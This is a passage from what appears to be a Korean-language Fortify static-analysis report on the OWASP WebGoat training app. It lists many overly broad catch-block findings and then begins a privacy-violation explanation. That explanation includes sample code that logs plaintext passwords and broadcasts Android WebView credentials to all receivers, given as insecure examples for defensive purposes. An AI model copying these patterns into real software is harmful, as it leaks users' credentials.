	    //System.out.println("Exception occured in defined pattern match");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4E13753D22B01B4D5318B21836B06C79" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UpdateProfile.java 줄 306의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>306</LineStart>
<Snippet>
	}
	catch (Exception e)
	{
	    s.setMessage("Error updating employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="42A6BC814DCB1C75C4714EC0B947BBBD" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 261의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>261</LineStart>
<Snippet>	    return getClassNameParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="66A9073F511859CAEC9FCB973C05A526" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ErrorScreen.java 줄 107의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ErrorScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ErrorScreen.java</FilePath>
<LineStart>107</LineStart>
<Snippet>				s.setCurrentScreen( s.getCourse().getFirstLesson().getScreenId() );
			}
			catch ( Throwable t )
			{
				s.setCurrentScreen( WebSession.WELCOME );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="756943D3566AC87A7A38437C5D1EDABC" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java 줄 133의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>133</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="54948CA0DC168EAA53F9D99070E20866" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UserTracker.java 줄 133의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/UserTracker.java</FilePath>
<LineStart>133</LineStart>
<Snippet>		usersDB.close();
	    }
	    catch (Exception e)
	    {}
	    return allUsers;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8EA05C5039B429E1E9B8537FA7EE060F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Exec.java 줄 431의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>431</LineStart>
<Snippet>	    results.setInterrupted();
	}
	catch (Throwable t)
	{
	    results.setThrowable(t);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="375E6CCD89473DA94BDC098CF3A3603C" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonTracker.java 줄 251의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>251</LineStart>
<Snippet>	    // Normal if the lesson has not been accessed yet.
	}
	catch (Exception e)
	{
	    System.out.println("Failed to load lesson state for " + screen);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FBCA15B99115484B4757D2BCF1269357" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ProductsAdminScreen.java 줄 85의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ProductsAdminScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ProductsAdminScreen.java</FilePath>
<LineStart>85</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8CE8D0654EA83CB302F32B1691465589" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ListStaff.java 줄 166의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>166</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employees");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C1FDE144BC2EC7DD9DBC1E4FA555675B" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 731의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>731</LineStart>
<Snippet>	    return getStringParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="810BD4DB55A85AAE019AD93AC0997ACF" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Login.java 줄 213의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>213</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employees");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="609F381F774B667AAE72B969E0806A02" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java 줄 149의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>149</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="741671ABDDF1E8940DDCC3B77DCA33B2" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 672의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>672</LineStart>
<Snippet>	    return getShortParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AE917003118457AD84906DF5A42B4703" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>BasicAuthentication.java 줄 248의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BasicAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BasicAuthentication.java</FilePath>
<LineStart>248</LineStart>
<Snippet>
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AE93665D20F756B705E08F3B47EAF2FD" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>RoleBasedAccessControl.java 줄 360의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>360</LineStart>
<Snippet>	    ue2.printStackTrace();
	}
	catch (Exception e)
	{
	    // All other errors send the user to the generic error page</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C58ACAE261FF9F31934D450BE5DF500D" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HttpBasics.java 줄 75의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpBasics.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpBasics.java</FilePath>
<LineStart>75</LineStart>
<Snippet>	    ec.addElement(b);
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5AB5D5DAFA7B18E0B0F36A1A2C64E1BF" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>BackDoors.java 줄 134의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>134</LineStart>
<Snippet>	    }
	}
	catch (Exception ex)
	{
	    ec.addElement(new PRE(ex.getMessage()));</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0D21FE1F66EB9E91642AD25EEC02E023" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ListStaff.java 줄 118의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>118</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employees");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BAB7A4F16185BF786F8CED54933248B4" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>RefreshDBScreen.java 줄 96의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RefreshDBScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/RefreshDBScreen.java</FilePath>
<LineStart>96</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="439EC3A59CF99A26C4EB33C316AD6216" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DeleteProfile.java 줄 123의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>123</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error deleting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="40AB32E93D2D1ECAD676906248995A01" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 335의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>335</LineStart>
<Snippet>	    return getFloatParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DBE15934EC88CA59FC8C923675999EBE" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Encoding.java 줄 934의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>934</LineStart>
<Snippet>			return ( URLDecoder.decode( str, "UTF-8" ) );
		}
		catch ( Exception e )
		{
			return ( "Decoding error" );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="90DD80E2E256F9063299B62559995727" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WebSession.java 줄 1027의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>1027</LineStart>
<Snippet>			}
		}
		catch ( Exception e )
		{
		}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="041BF6103B1126BD1BBA51F5F686610D" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 356의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>356</LineStart>
<Snippet>	    return getIPParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="264124A061697D27C6C39371CD3E4442" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java 줄 223의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>223</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B9277DEF6F44EC28CE4A7C369F0CD44D" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 610의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>610</LineStart>
<Snippet>	    return getRawParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6410A73F40624B0A23EAE7A10ADA7B74" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DefaultLessonAction.java 줄 213의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>213</LineStart>
<Snippet>			}
		}
		catch ( Exception e )
		{
			s.setMessage( "Error getting user name" );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="37084DEC65252402B97ADF6ED6030A72" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SqlNumericInjection.java 줄 159의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>159</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="89">
                        <groupTitle>Privacy Violation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 dumpSession() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Privacy violation은 다음 경우에 발생합니다.

1. 사용자 개인 정보가 프로그램에 입력됩니다.

2. 데이터는 콘솔, file system 또는 네트워크와 같은 외부 위치에 작성됩니다.


예제 1: 다음 코드에는 데이터베이스에 추가되는 레코드를 로그 파일의 콘텐트에 저장하여 추적하는 로깅 명령문이 있습니다.


pass = getPassword();
...
dbmsLog.println(id+":"+pass+":"+type+":"+tstamp);


Example 1의 코드는 일반 텍스트 암호를 파일 시스템에 기록합니다. 많은 개발자가 파일 시스템을 안전한 데이터 저장소로 신뢰하지만 무조건 신뢰해서는 안 됩니다. 특히 개인 정보가 관련된 경우가 대표적입니다.

개인 정보는 다음의 두 가지 이유 때문에 모바일 환경에서 크게 대두되는 문제 중 하나입니다. 그중 하나는 장치 분실 가능성이 훨씬 더 높다는 점이고, 다른 하나는 모바일 응용 프로그램 사이에서 프로세스 간 통신이 이뤄진다는 점입니다. 모바일 플랫폼에서는 다양한 소스에서 다운로드된 응용 프로그램이 같은 장치에서 함께 실행됩니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 응용 프로그램 작성자는 장치에서 실행되는 다른 응용 프로그램으로 주소가 지정된 메시지에 포함하는 정보를 주의하여 선택해야 합니다. 모바일 응용 프로그램 사이에 진행되는 프로세스 간 통신에 민감한 정보를 포함해서는 안 됩니다.

예제 2: 다음 코드는 Android WebView 저장소에서 지정된 사이트의 사용자 이름과 암호를 읽은 다음 등록된 모든 수신자에게 브로드캐스트합니다.

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);
    String username = credentials[0];
    String password = credentials[1];
    Intent i = new Intent();
    i.setAction("SEND_CREDENTIALS");
    i.putExtra("username", username);
    i.putExtra("password", password);
    view.getContext().sendBroadcast(i);
  }
});
...


이 예는 몇 가지 문제를 보여줍니다. 첫째, WebView 자격 증명은 기본적으로 일반 텍스트로 저장되고 해시되지 않습니다. 사용자가 루팅된 장치나 에뮬레이터를 사용하는 경우 지정된 사이트에 저장된 암호를 읽을 수 있습니다. 둘째, 일반 텍스트 자격 증명은 등록된 모든 수신자에게 브로드캐스트되어 SEND_CREDENTIALS 작업을 통해 인텐트를 수신 대기하도록 등록된 모든 수신자가 메시지를 수신합니다. 이 경우 수정 방법으로 권한을 사용하지 않는 것이 좋지만, 브로드캐스트는 수신자 수를 제한하는 권한으로도 보호되지 않습니다.

개인 정보는 다음과 같은 다양한 방식으로 프로그램에 입력됩니다.

- 암호 또는 개인 정보의 형태로 사용자가 직접 입력

- 응용 프로그램이 데이터베이스 또는 기타 데이터 저장소에서 접근

- 협력업체 또는 타사를 통해 간접적으로

일반적으로 모바일 환경에서 이 개인 정보는 암호, SSN 및 기타 일반 개인 정보에 따라 다음 사항을 포함합니다.

- 위치

- 휴대폰 번호

- 일련번호 및 장치 ID

- 네트워크 연산자 정보

- 보이스메일 정보


개인 정보로 명명되지 않은 데이터도 상황에 따라 개인 정보로 해석될 수 있습니다. 예를 들어, 학생 ID 번호는 명시적이고 공개적으로 각 학생의 개인 정보에 매핑되지 않기 때문에 보통 개인 정보로 간주하지 않습니다. 하지만 학교에서 학생의 주민 등록 번호를 기반으로 ID 번호를 생성하는 경우 ID 번호는 개인 정보로 간주해야 합니다.

보안 및 개인 정보 문제는 서로 상충하는 것처럼 보일 때가 있습니다. 보안 관점에서 보면 이후에 비정상적인 활동을 식별할 수 있도록 모든 중요한 작업을 기록해야 합니다. 하지만 개인 정보가 관련된 경우 이 방법은 위험이 따릅니다.

개인 정보를 위험하게 처리하는 방법은 여러 가지가 있겠지만 공통적인 위험은 잘못된 신뢰에서 비롯됩니다. 프로그래머는 프로그램이 실행되는 운영 환경을 신뢰하기 때문에 개인 정보를 파일 시스템, 레지스트리 또는 기타 로컬로 제어되는 리소스에 저장해도 무방하다고 생각합니다. 하지만 특정 리소스에 대한 액세스가 제한되어 있는 경우에도 액세스 권한을 가진 개인을 신뢰할 수 있다고 보장할 수 없습니다. 일례로, 2004년, AOL의 한 비양심적인 직원이 해외 도박 웹 사이트를 대상으로 영업하는 스패머에게 약 9천 2백만 개의 고객 전자 메일 주소를 팔았습니다[1].

이런 대형 익스플로이트 사건에 대응하여 개인 정보 수집 및 관리에 대한 규제가 점점 엄격해지고 있습니다. 조직의 위치, 업종 및 취급하는 개인 정보의 속성에 따라 조직은 다음의 연방 정부 및 주 정부의 규제를 하나 이상 준수할 의무가 있습니다.

- 세이프 하버 협정(Safe Harbor Privacy Framework)[3]

- GLBA(Gramm-Leach Bliley Act)[4]

- HIPAA(Health Insurance Portability and Accountability Act)[5]

- California SB-1386 [6]

이런 규제에도 불구하고 privacy violation은 우려할 만한 빈도로 계속 발생하고 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>보안과 개인 정보가 충돌할 경우, 보통 개인 정보에 더 높은 우선 순위를 부여해야 합니다. 이를 따르면서 필요한 보안 정보도 유지하기 위해 프로그램을 종료하기 전에 모든 개인 정보를 정리(cleanse)합니다.

